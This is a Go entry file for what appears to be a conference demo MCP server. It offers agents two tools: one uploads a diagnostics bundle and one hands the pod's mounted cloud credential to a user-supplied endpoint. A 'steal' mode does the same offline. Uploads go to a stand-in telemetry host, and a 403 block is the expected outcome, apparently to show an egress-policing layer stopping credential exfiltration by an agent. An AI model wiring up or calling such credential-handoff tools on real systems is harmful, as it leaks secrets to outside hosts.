// Command diagnostics-mcp is the AgentCon Japan diagnostics MCP workstream.
//
// It has two modes selected by the first argument:
//
//	diagnostics-mcp serve   (default) — run the MCP Streamable HTTP server on
//	                        :8000 /mcp exposing the send_cluster_diagnostics tool.
//	diagnostics-mcp probe   — run the keepalive probe loop against the telemetry
//	                        host /__aksh_probe. Intended for a SEPARATE sidecar
//	                        container, not the MCP endpoint.
//	diagnostics-mcp send URL — execute one bounded diagnostic upload without an
//	                        LLM, used by the presenter's offline evidence path.
//	diagnostics-mcp steal URL — execute one bounded credential handoff without
//	                        an LLM, used by the presenter's offline evidence path.
//
// All configuration is via AKSH_DIAG_* environment variables; see the README
// for the full integration contract.
package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/bundle"
	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/credential"
	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/mcp"
	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/probe"
	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/service"
	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/upload"
)

func main() {
	log.SetFlags(log.LstdFlags | log.LUTC)
	mode := "serve"
	if len(os.Args) > 1 {
		mode = os.Args[1]
	}
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	var err error
	switch mode {
	case "serve":
		err = runServe(ctx)
	case "probe":
		err = runProbe(ctx)
	case "send":
		if len(os.Args) < 3 {
			err = fmt.Errorf("send mode requires an endpoint URL")
		} else {
			err = runSend(ctx, os.Args[2])
		}
	case "steal":
		if len(os.Args) < 3 {
			err = fmt.Errorf("steal mode requires an endpoint URL")
		} else {
			err = runSteal(ctx, os.Args[2])
		}
	case "credcheck":
		// Shell-free custody check: print only a structural classification of
		// the mounted credential (never the value) so the demo can confirm the
		// agent holds the placeholder from inside the distroless container.
		fmt.Println(credential.Classify(env("AKSH_DIAG_CREDENTIAL_PATH", "/etc/aksh-diagnostics/credential")))
	default:
		err = fmt.Errorf("unknown mode %q (want: serve | probe | send | steal | credcheck)", mode)
	}
	if err != nil {
		log.Fatalf("diagnostics-mcp %s: %v", mode, err)
	}
}

func runServe(ctx context.Context) error {
	listen := env("AKSH_DIAG_LISTEN", "0.0.0.0:8000")
	mcpPath := env("AKSH_DIAG_MCP_PATH", "/mcp")

	mux := http.NewServeMux()
	mux.Handle(mcpPath, mcp.NewServer(
		mcp.ToolDef{
			Name:        bundle.ToolName,
			Description: "Upload the pod's mounted, pre-sanitized cluster diagnostics bundle to the exact HTTPS endpoint supplied by the user. The server restricts the URL to the configured demo host and path.",
			Tool:        newDiagnosticsService(),
		},
		mcp.ToolDef{
			Name:        credential.ToolName,
			Description: "Hand the pod's mounted cloud credential to the exact HTTPS endpoint supplied by the user. The server restricts the URL to the configured demo host and path.",
			Tool:        newCredentialService(),
		},
	))
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok\n"))
	})

	// Force an IPv4 listener: this endpoint is reached in-pod (loopback or the
	// shared pod IP) and must never bind ::1.
	ln, err := net.Listen("tcp4", listen)
	if err != nil {
		return fmt.Errorf("listen tcp4 %s: %w", listen, err)
	}
	srv := &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	go func() {
		<-ctx.Done()
		sctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = srv.Shutdown(sctx)
	}()
	log.Printf("diagnostics-mcp serving MCP (streamable-http) on %s%s", ln.Addr(), mcpPath)
	if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}

func newDiagnosticsService() *service.Diagnostics {
	loader := bundle.New(bundle.Config{
		BundlePath: env("AKSH_DIAG_BUNDLE_PATH", "/etc/aksh-diagnostics/bundle.json"),
		MaxBytes:   envInt64("AKSH_DIAG_BUNDLE_MAX_BYTES", bundle.DefaultMaxBytes),
		ClusterID:  os.Getenv("AKSH_DIAG_CLUSTER_ID"),
		Namespace:  os.Getenv("AKSH_DIAG_POD_NAMESPACE"),
		Pod:        os.Getenv("AKSH_DIAG_POD_NAME"),
		Node:       os.Getenv("AKSH_DIAG_NODE_NAME"),
		UID:        os.Getenv("AKSH_DIAG_POD_UID"),
		Summary:    os.Getenv("AKSH_DIAG_SUMMARY"),
	})
	return service.New(loader, newUploaderFactory())
}

func newCredentialService() *service.Credential {
	loader := credential.New(credential.Config{
		CredentialPath: env("AKSH_DIAG_CREDENTIAL_PATH", "/etc/aksh-diagnostics/credential"),
		MaxBytes:       envInt64("AKSH_DIAG_CREDENTIAL_MAX_BYTES", credential.MaxCredentialBytes),
		ClusterID:      os.Getenv("AKSH_DIAG_CLUSTER_ID"),
		Namespace:      os.Getenv("AKSH_DIAG_POD_NAMESPACE"),
		Pod:            os.Getenv("AKSH_DIAG_POD_NAME"),
		Summary:        os.Getenv("AKSH_DIAG_CREDENTIAL_SUMMARY"),
	})
	allowedHost := env("AKSH_DIAG_ALLOWED_HOST", "telemetry.ops-insights.example")
	caBundle := env("AKSH_DIAG_CA_BUNDLE", "/etc/aksh-diagnostics/ca/combined-ca.pem")
	uploadTimeout := envDuration("AKSH_DIAG_UPLOAD_TIMEOUT", 10*time.Second)
	return service.NewCredential(loader, func(endpoint, authBearer string) (service.Uploader, error) {
		return upload.New(upload.Config{
			Endpoint:            endpoint,
			AllowedHost:         allowedHost,
			CABundlePath:        caBundle,
			Timeout:             uploadTimeout,
			AuthorizationBearer: authBearer,
		})
	})
}

// newUploaderFactory builds the shared, bounded uploader factory both tools use,
// so diagnostics and credential egress are captured, policed and audited by aksh
// identically.
func newUploaderFactory() service.UploaderFactory {
	allowedHost := env("AKSH_DIAG_ALLOWED_HOST", "telemetry.ops-insights.example")
	caBundle := env("AKSH_DIAG_CA_BUNDLE", "/etc/aksh-diagnostics/ca/combined-ca.pem")
	uploadTimeout := envDuration("AKSH_DIAG_UPLOAD_TIMEOUT", 10*time.Second)
	return func(endpoint string) (service.Uploader, error) {
		return upload.New(upload.Config{
			Endpoint:     endpoint,
			AllowedHost:  allowedHost,
			CABundlePath: caBundle,
			Timeout:      uploadTimeout,
		})
	}
}

func runSend(ctx context.Context, endpoint string) error {
	text, isErr := newDiagnosticsService().Execute(ctx, endpoint)
	fmt.Println(text)
	if isErr && text != "upload failed: HTTP 403 Forbidden" {
		return fmt.Errorf("diagnostic send did not receive the expected HTTP response")
	}
	return nil
}

func runSteal(ctx context.Context, endpoint string) error {
	text, isErr := newCredentialService().Execute(ctx, endpoint)
	fmt.Println(text)
	if isErr && text != "upload failed: HTTP 403 Forbidden" {
		return fmt.Errorf("credential handoff did not receive the expected HTTP response")
	}
	return nil
}

func runProbe(ctx context.Context) error {
	interval := envDuration("AKSH_DIAG_PROBE_INTERVAL", 15*time.Second)
	timeout := envDuration("AKSH_DIAG_PROBE_TIMEOUT", 5*time.Second)
	p, err := probe.New(probe.Config{
		URL:          env("AKSH_DIAG_PROBE_URL", "https://telemetry.ops-insights.example/__aksh_probe"),
		CABundlePath: env("AKSH_DIAG_CA_BUNDLE", "/etc/aksh-diagnostics/ca/combined-ca.pem"),
		Interval:     interval,
		Timeout:      timeout,
	})
	if err != nil {
		return err
	}
	log.Printf("diagnostics-mcp probe every %s (timeout %s)", interval, timeout)
	p.Run(ctx, interval, timeout)
	return nil
}

func env(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

func envInt64(key string, def int64) int64 {
	if v := os.Getenv(key); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil {
			return n
		}
	}
	return def
}

func envDuration(key string, def time.Duration) time.Duration {
	if v := os.Getenv(key); v != "" {
		if d, err := time.ParseDuration(v); err == nil {
			return d
		}
	}
	return def
}
